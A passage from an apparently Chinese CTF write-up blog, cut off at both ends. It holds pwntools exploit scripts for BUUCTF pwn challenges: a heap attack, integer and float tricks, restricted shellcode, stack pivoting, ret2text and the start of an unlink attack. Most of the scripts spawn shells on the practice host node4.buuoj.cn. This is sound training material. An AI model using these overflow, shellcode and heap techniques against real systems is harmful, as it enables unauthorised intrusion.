class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27943</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ty_pe,number</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br>    sla(<span class="hljs-string">&#x27;your inode number:&#x27;</span>,<span class="hljs-built_in">str</span>(number))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ty_pe</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ty_pe</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;what do you want to say at last? \n&#x27;</span>,content)<br><span class="hljs-comment">#-----------------------------------------------------</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xABCDEFabcdef</span>)<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>   add(<span class="hljs-number">2</span>,<span class="hljs-number">0xABCDEF</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xabcdefabcdef</span>)<span class="hljs-comment">#bool</span><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;your short type inode number :&#x27;</span>)<br>heap_low_addr=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">if</span> heap_low_addr &lt; <span class="hljs-number">0</span>:<br>   heap_low_addr += <span class="hljs-number">0x10000</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heap_low_2byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_low_addr)<br>add(<span class="hljs-number">2</span>,heap_low_addr-<span class="hljs-number">0xa0</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span> + <span class="hljs-number">0x20</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>   free(<span class="hljs-number">1</span>)<br>   add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;your int type inode number :&#x27;</span>)<br>main_arena_low_4byte=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])-<span class="hljs-number">96</span><br><span class="hljs-keyword">if</span> main_arena_low_4byte &lt; <span class="hljs-number">0</span>:<br>   main_arena_low_4byte += <span class="hljs-number">0x100000000</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;main_arena=&#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena_low_4byte)<br>malloc_hook_low_4byte = (main_arena_low_4byte &amp; <span class="hljs-number">0xFFFFF000</span>) + (libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="hljs-number">0xFFF</span>)<br>libc_base_low_4byte=malloc_hook_low_4byte-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>stdin_filno_low_4byte=libc_base_low_4byte+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="hljs-number">0x70</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base_low_4byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base_low_4byte)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;stdin_filno_low_4byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(stdin_filno_low_4byte)<br>add(<span class="hljs-number">2</span>,stdin_filno_low_4byte&amp;<span class="hljs-number">0xffff</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">666</span>)<br>leave(<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-number-game">wustctf2020_number_game</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/114823490">BUUCTF]PWN——wustctf2020_number_game_mcmuyanga的博客-CSDN博客</a></p><p>这题有意思，我们被要求输个负数，取反后还要是负数，才能开shell</p><p>我们输入数据后会转换成补码（负数的补码=原码取反+1）存放在内存中，32位int型表示的范围是<code>-2147483648~2147483647</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26350</span> )<br>r.sendline(<span class="hljs-string">&#x27;-2147483648&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="护网杯-2018-gettingstart">护网杯_2018_gettingstart</h3><p>（浮点数内存表示）</p><p>参考师傅：<a href="https://www.yuque.com/u239977/cbzkn3/hp33wd">护网杯_2018_gettingstart（浮点数内存表示） · 语雀 (yuque.com)</a></p><p>主要就是double怎么转化到计算机里存储的</p><p>一个在线计算网站：</p><p><a href="http://www.binaryconvert.com/convert_double.html?decimal=048046049">Double (IEEE754 Double precision 64-bit) Converter (binaryconvert.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29374</span> )<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="hljs-number">0x3FB999999999999A</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="starctf-2019-babyshell">starctf_2019_babyshell</h3><p>（有限制的shellcode）</p><p>参考师傅： <a href="https://blog.csdn.net/Y_peak/article/details/115409705">BUUCTF-pwn]——starctf_2019_babyshell_Y_peak的博客-CSDN博客_starctf_2019_babyshell</a></p><p>能绕过循环检查\x00</p><p>\x00B后面加上一个字符， 对应一个汇编语句</p><p>\x00J\x00也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25763</span> )<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sc=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f  </span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    push rsp </span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor esi, esi               </span><br><span class="hljs-string">    xor edx, edx           </span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;\x00bb&#x27;</span>+sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer-overflow-0">picoctf_2018_buffer overflow 0</h3><p>ssh-p 27306 <a href="mailto:CTFMan@node4.buuoj.cn">CTFMan@node4.buuoj.cn</a></p><p>连入ssh，输入密码guest</p><p>这里的函数signal(11, sigsegv_handler);</p><p>如果是无效的内存引用就执行sigsegv_handler函数，</p><p>里面是fprintf(stderr, “%s\n”, flag)</p><p>以字符串的形式发送flag到stderr流当中</p><p>stderr：【unix】标准输出(设备)文件，对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%BE%93%E5%87%BA/5885826">数据输出</a>到标准输出文件，而将错误信息送到标准错误文件中。在C中，程序执行时，一直处于开启状态。</p><p><a href="https://www.cnblogs.com/jing1617/p/8213840.html">Linux常用系统函数 - tigerloveapple - 博客园 (cnblogs.com)</a>：</p><p>getegid()用来取得执行目前进程有效组识别码. 有效的组识别码用来决定进程执行时组的权限.</p><p>返回值：返回有效的组识别码.</p><p>getresgid() 分别获取真实的,有效的和保存过的组标识号</p><p>这题我们</p><p>./vuln argv[1]</p><p>./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</p><p>多输几个a就会输出flag</p><p>参考师傅：<a href="https://www.jianshu.com/p/891debfabf32">picoctf_2018_buffer overflow 0（7/100） - 简书 (jianshu.com)</a></p><h3 id="BSidesCF-2019-Runit">[BSidesCF 2019]Runit</h3><p>（shellcode）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./runit&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28642</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>sl(sc)<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="wdb-2018-3rd-soEasy">wdb_2018_3rd_soEasy</h3><p>(栈迁移)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./wdb_2018_3rd_soEasy&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29461</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------</span><br>leave_ret=<span class="hljs-number">0x08048478</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>ru(<span class="hljs-string">&#x27;Hei,give you a gift-&gt;0x&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>stack=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack)<br>sl(<span class="hljs-string">&#x27;aaaa&#x27;</span>+sc.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p32(stack)+p32(leave_ret))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="suctf-2018-stack">suctf_2018_stack</h3><p>（栈平衡）</p><p>Ubuntu18要检查栈平衡</p><p><a href="https://blog.csdn.net/qq_41560595/article/details/112161243">ret2text涉及到的堆栈平衡问题_一路开花●-●的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./SUCTF_2018_stack&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25323</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br>backdoor=<span class="hljs-number">0x400676</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor+<span class="hljs-number">1</span>))<br><span class="hljs-comment">#sl(&#x27;a&#x27;*0x20+&#x27;b&#x27;*8+p64(backdoor+2))</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>实际操作的话加个ret就行，如果有限制，无脑的做法加减几个数试试</p><h3 id="hitcontraining-unlink">hitcontraining_unlink</h3><h4 id="fastbin-attack：">fastbin attack：</h4><p>修改fd与bk，用choice5，利用后门函数</p><p>还是不明白注释那里为啥会改到bk</p><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/113105091">BUUCTF]PWN——hitcontraining_unlink_mcmuyanga的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./bamboobox&#x27;</span><br>local_libc  = <span 